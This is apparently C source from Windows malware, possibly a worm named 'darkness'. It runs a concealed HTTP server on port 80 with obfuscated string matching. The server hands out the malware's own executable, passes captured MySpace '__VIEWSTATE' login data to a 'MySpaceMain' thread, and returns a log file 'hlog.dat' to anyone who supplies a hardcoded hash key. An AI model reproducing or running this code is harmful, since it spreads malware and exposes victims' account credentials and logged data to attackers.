#include "myspace.h"
#include "mylib.h"
#include "dns.h"
#include "server.h"

#include <windows.h>
#include <winsock.h>
#include <wininet.h>

static int 
HttpServerSendFile
(struct sendfile_d *sendfile) {
     HANDLE hFile;
     unsigned long BytesRead;
     char buf[0x400];
     hFile=CreateFile(sendfile->fname,FILE_ALL_ACCESS,FILE_SHARE_READ,NULL,
        OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
     if(hFile == NULL || hFile == INVALID_HANDLE_VALUE)
        return(0x0);
     sprintf(buf,
         "HTTP/1.1 200 OK\r\n"
         "Connection: close\r\n"
         "Content-Length: %d\r\n\r\n",
         GetFileSize(hFile,0x0));
     send(sendfile->remote_addr,buf,strlen(buf),0x0);
     memset(buf,'\0',strlen(buf));
     do { 
       ReadFile(hFile,buf,sizeof(buf),&BytesRead,0x0); 
       send(sendfile->remote_addr,buf,BytesRead,0x0);
     } while(BytesRead > 0x0);
     CloseHandle(hFile);
     closesocket(sendfile->remote_addr);
     return(0x1);
}

void 
HttpServerMain
(struct darkness_d *darkness) {
     struct sockaddr_in client,server;
     struct sendfile_d sendfile;
     char buf[0x4E20];
     unsigned long local_addr, dwSize;
     server.sin_family=AF_INET;
     server.sin_addr.s_addr=INADDR_ANY;
     server.sin_port=htons(0x50);
     local_addr=socket(AF_INET,SOCK_STREAM,0x0);
     if(!bind(local_addr,(struct sockaddr *)&server,sizeof(server))) 
        while(0x1) {
           dwSize=sizeof(client);
           if(listen(local_addr,SOMAXCONN) != SOCKET_ERROR) 
              sendfile.remote_addr=accept(local_addr,(struct sockaddr*)&client,&dwSize);
           memset(buf,'\0',sizeof(buf));
           Sleep(0x600);
           recv(sendfile.remote_addr,buf,sizeof(buf),0x0);
           memset(sendfile.fname,'\0',sizeof(sendfile.fname));
           if(strstr(buf,riddle_enc("2i|i"))) { // .exe
              strcpy(sendfile.fname,darkness->sysfile);
              if(strstr(buf,riddle_enc("jjaTPb^_L_P"))) { // __VIEWSTATE
                 struct myspace_param_d myspace;
                 myspace.bRawData=0x1;
                 strcpy(myspace.lpLoginData,buf);
                 strcpy(myspace.lpEditData,DnsGetEditData());
                 CreateThread(NULL,0x0,
                      (LPTHREAD_START_ROUTINE)MySpaceMain,
                      &myspace,0x0,0x0);
                 //Sleep(0x3E8);
              }
           } 
           else if(strstr(buf,riddle_enc("SQ…PSTƒ…Y…Y‚YV„ƒV„…YXTƒV†U…SWUS"))) 
                   // 31e034cae9e9b96dc6de984c6f5e3753
                   strcpy(sendfile.fname,riddle_enc("ptwo6li|")); // hlog.dat
           else if(strstr(buf,"HTTP/1.1")) // HTTP/1.1
                   strcpy(sendfile.fname,darkness->html_file);
           if(strlen(sendfile.fname) > 0x0) {
              CreateThread(NULL,0x0,
                   (LPTHREAD_START_ROUTINE)HttpServerSendFile,
                   &sendfile,0x0,0x0);
           }
     } 
     closesocket(local_addr);
     ExitThread(0x0);
}
